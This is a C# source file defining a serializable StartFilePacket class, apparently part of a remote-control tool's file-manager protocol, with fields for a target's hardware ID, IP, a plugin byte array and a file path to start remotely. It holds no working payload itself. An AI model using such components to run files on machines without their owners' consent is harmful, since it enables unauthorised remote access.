using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class StartFilePacket : IPacket
    {
        public StartFilePacket(string filePath) : base() 
        {
            packetType = PacketType.FM_START_FILE;
            
            this.filePath = filePath;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string filePath { get; set; }
    }
}
